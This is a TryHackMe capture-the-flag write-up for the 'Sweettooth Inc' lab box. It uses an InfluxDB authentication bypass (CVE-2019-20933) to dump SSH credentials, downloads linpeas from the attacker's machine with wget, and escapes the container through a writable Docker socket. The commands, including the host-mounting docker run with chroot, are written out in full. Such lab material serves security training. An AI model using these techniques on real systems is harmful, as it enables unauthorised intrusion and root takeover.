---
title: "TryHackMe Sweettooth Inc"
date: 2021-07-27 12:21:00 -0800
categories: [thm, writeup]
tags: [writeup]
toc: true
---

> Sweettooth Inc. needs your help to find out how secure their system is!



As with all boxes, we start with an nmap scan.

## Nmap

```
kali@kali:~/Desktop/thm$ nmap -sC -sV -o nmap.scan 10.10.182.126
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:07 EDT
Nmap scan report for 10.10.182.126
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36924/tcp   status
|   100024  1          40358/tcp6  status
|   100024  1          49705/udp   status
|_  100024  1          53765/udp6  status
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp open  http    InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three things, rpcbind, ssh, and influxdb. As the TryHackMe page has questions about a database, we look at ``InfluxDB``.


## InfluxDB

When going to the webpage we see this:

![](/assets/img/2021-07-28-08-40-57.png)

From the nmap scan, we know this in InfluxDB version 1.3. Let's look at the documentation for this (as there is an HTTP server running):

https://docs.influxdata.com/influxdb/v1.3/tools/api/

There are a few endpoints:

![](/assets/img/2021-07-28-08-43-05.png)

Visiting ``/debug/requests`` leaks what appears to be a username making queries.

We get the username ``o5yY6yya``.

``/query`` and ``/write`` both require authentication, and we only have a username.

Researching vulnerabilities for InfluxDB, we find a vulnerability where we can bypass authentication given we know a username - CVE-2019-20933.


## CVE-2019-20933

A quick google search leads us to some exploit code on Github: https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

Looking at the code, it appears to bruteforce usernames given a wordlist, then drops into a scuffed "shell" to interact with the db.

Let's run the exploit:

```
kali@kali:~/Desktop/thm/sweettoothinc/InfluxDB-Exploit-CVE-2019-20933$ echo "o5yY6yya" > username.txt
kali@kali:~/Desktop/thm/sweettoothinc/InfluxDB-Exploit-CVE-2019-20933$ python3 __main__.py 
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |                                     
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_                                    
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|                                   
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_                                    
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|                                   
                                                         | |                                                     
                                                         |_|                                                     
CVE-2019-20933

Insert ip host (default localhost): 10.10.114.8
Insert port (default 8086): 
Insert influxdb user (wordlist path to bruteforce username): username.txt

Start username bruteforce
[v] o5yY6yya

Host vulnerable !!!
Databases list:

1) creds
2) docker
3) tanks
4) mixer
5) _internal

Insert database name (exit to close): 
```

I wasn't sure how InfluxDB  works, so I followed the official schema guide: https://docs.influxdata.com/influxdb/v1.8/query_language/explore-schema/


```
Insert database name (exit to close): creds
[creds] Insert query (exit to change db): show series
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "key"
                    ],
                    "values": [
                        [
                            "ssh,user=uzJk6Ry98d8C"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```

Ok, so it looks like there are two values, a username and something related to ssh.

I'm thinking of ssh like a table. Let's look at the keys/columns:

```
[creds] Insert query (exit to change db): show field keys from "ssh"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "pw",
                            "float"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Ok nice, there is a password. Let's grab it:

```
[creds] Insert query (exit to change db): select pw from ssh
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "pw"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            REDACTED
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

And we get creds we can SSH with:

``uzJk6Ry98d8C:REDACTED``

## Getting User

Remember SSH is listening on port 2222:

```
kali@kali:~/Desktop/thm/sweettoothinc/InfluxDB-Exploit-CVE-2019-20933$ ssh -p 2222 uzJk6Ry98d8C@10.10.114.8
uzJk6Ry98d8C@10.10.114.8's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
uzJk6Ry98d8C@575d68b41bfa:~$ 
```

And we can print out the user flag:

```
uzJk6Ry98d8C@575d68b41bfa:~$ ls
data  meta.db  user.txt  wal
uzJk6Ry98d8C@575d68b41bfa:~$ cat user.txt
THM{REDACTED}
uzJk6Ry98d8C@575d68b41bfa:~$ 
```

## PrivEsc

I transferred linpeas to the machine using python3's http.server module:

My Machine:

```
kali@kali:/opt$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Victim Machine:

```
uzJk6Ry98d8C@575d68b41bfa:~$ wget 10.8.203.189:8000/linpeas.sh
converted 'http://10.8.203.189:8000/linpeas.sh' (ANSI_X3.4-1968) -> 'http://10.8.203.189:8000/linpeas.sh' (UTF-8)
--2021-07-28 15:58:30--  http://10.8.203.189:8000/linpeas.sh
Connecting to 10.8.203.189:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 462687 (452K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                   100%[=============================================>] 451.84K   530KB/s   in 0.9s   

2021-07-28 15:58:31 (530 KB/s) - 'linpeas.sh' saved [462687/462687]

uzJk6Ry98d8C@575d68b41bfa:~$ 
```

Here's a few parts that stick out to me.

Machine is vulnerable to kernel exploits:

```
════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system                                                                                    
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                    
Linux version 3.16.0-11-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u2) ) #1 SMP Debian 3.16.84-1 (2020-06-09)
```

We are in a Docker container and we can write to the Docker socket:

```
════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present                                                                     
╔══════════╣ Container details                                                                                   
═╣ Is this a container? ........... docker═╣ Any running containers? ........ No                                 
╔══════════╣ Docker Container details                                                                            
═╣ Am I inside Docker group ....... No                                                                           
═╣ Looking and enumerating Docker Sockets
You have write permissions over Docker socket /run/docker.sock
```


As the challenge asks for two different root flags and we know that we are inside a container, it is clear that we should exploit that something that will allow us to escape/read the host file system, so I decide to use the fact that I can write to the docker socket over the ability to utilize kernel exploit.

There are some one-liner commands that would allow us to mount the filesystem of a container we spin up, however there are two problems with these:

1: We don't have access to the docker binary so we cannot communicate directly. 
2: The best alternative we have is curl, however the version of curl installed is so old that we cannot use ``--unix-socket`` to communicate with the socket.

Because of this, I opted to go with another option: forward the docker socket over SSH. This would allow me to use my local docker binaries/locally installed curl.

I found this blog post detailing how to do this: https://blog.ruanbekker.com/blog/2018/04/30/forwarding-the-docker-socket-via-a-ssh-tunnel-to-execute-docker-commands-locally/


The following commands are done on my machine:


I modified the command given in the linked article a little bit to fit my needs:

```
ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -NL localhost:2377:/var/run/docker.sock -p 2222 uzJk6Ry98d8C@10.10.114.8
```

Opening up another terminal, we can verify this worked:

```
kali@kali:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:2377          0.0.0.0:*               LISTEN      4137/ssh            
tcp6       0      0 ::1:2377                :::*                    LISTEN      4137/ssh            
```

Let's tell my local docker binary to point to this forwarded socket:

```
kali@kali:~$ export DOCKER_HOST="localhost:2377"
```

Now let's check which containers are running:

```
kali@kali:~$ docker ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS                                          NAMES
575d68b41bfa   sweettoothinc:latest   "/bin/bash -c 'chmod…"   42 minutes ago   Up 42 minutes   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
```

Let's get a shell on this:

```
kali@kali:~$ docker exec -it 575d68b41bfa /bin/bash
root@575d68b41bfa:/# 
```

Aaand we have root on the container! Let's grab the root flag:

```
root@575d68b41bfa:/# cat /root/root.txt
THM{REDACTED}
root@575d68b41bfa:/# 
```

## Escape/Root on Host

Now let's try to escape.

Looking at the HackTricks page for docker escapes, if we have the docker binary we can mount the root filesystem using the following command:

```
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```

The problem with this is that we cannot connect to the internet to download what is needed to spin up an ubuntu container. Because of this, we have to change it to an image we have locally.

Let's see what we can work with:

```
kali@kali:~$ docker images
REPOSITORY      TAG       IMAGE ID       CREATED        SIZE
sweettoothinc   latest    26a697c0d00f   2 months ago   359MB
influxdb        1.3.0     e1b5eda429c3   4 years ago    227MB
```

We can spin up another ``sweettoothinc`` image, which we know is an older version of Debian (which is fine for what we need).

Let's do this:

```
docker run -v /:/mnt --rm -it sweettoothinc chroot /mnt sh
```

It starts but I'm not dropped into a shell, I'm dropped into some kind of logging output. Opening up another terminal on my host machine, I set the environment variable again to tell the docker binary to point to the forwarded socket and get a shell on the container we just started:

```
kali@kali:~$ docker ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED              STATUS              PORTS                                          NAMES
c679d31ea25c   sweettoothinc          "/bin/bash -c 'chmod…"   About a minute ago   Up About a minute   8086/tcp                                       serene_leakey
575d68b41bfa   sweettoothinc:latest   "/bin/bash -c 'chmod…"   48 minutes ago       Up About an hour    0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
kali@kali:~$ docker exec -it c679d31ea25c /bin/bash
root@c679d31ea25c:/# 
```

And we can grab the root flag on the host machine!

```
root@c679d31ea25c:/# cd /mnt
root@c679d31ea25c:/mnt# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
root@c679d31ea25c:/mnt# cat /mnt/root/root.txt
THM{REDACTED}
root@c679d31ea25c:/mnt# 
```


